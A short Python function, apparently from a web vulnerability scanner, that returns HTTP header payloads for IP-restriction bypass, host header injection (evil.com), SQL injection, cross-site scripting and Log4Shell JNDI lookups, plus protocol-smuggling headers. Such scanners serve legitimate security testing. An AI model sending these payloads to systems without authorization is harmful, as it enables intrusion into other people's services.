def get_all_payloads():
    return [
        # Bypass IPs
        ("bypass_ip", {"X-Forwarded-For": "127.0.0.1"}),
        ("bypass_ip", {"X-Originating-IP": "127.0.0.1"}),
        ("bypass_ip", {"X-Remote-IP": "127.0.0.1"}),
        ("bypass_ip", {"Client-IP": "127.0.0.1"}),

        # Host Header Injection
        ("host_injection", {"Host": "evil.com"}),
        ("host_injection", {"Host": "localhost"}),

        # SQL Injection
        ("sqli", {"User-Agent": "' OR 1=1 --"}),
        ("sqli", {"X-Forwarded-For": "' UNION SELECT 1,2,3 --"}),

        # XSS
        ("xss", {"User-Agent": "<script>alert('XSS')</script>"}),
        ("xss", {"Referer": "javascript:alert(1)"}),

        # Log4Shell
        ("log4j", {"User-Agent": "${jndi:ldap://127.0.0.1:1389/a}"}),
        ("log4j", {"X-Api-Version": "${jndi:dns://127.0.0.1/a}"}),

        # Protocol Smuggling
        ("proto_smuggle", {"X-Forwarded-Proto": "http"}),
        ("proto_smuggle", {"X-Forwarded-Scheme": "http"}),
    ]
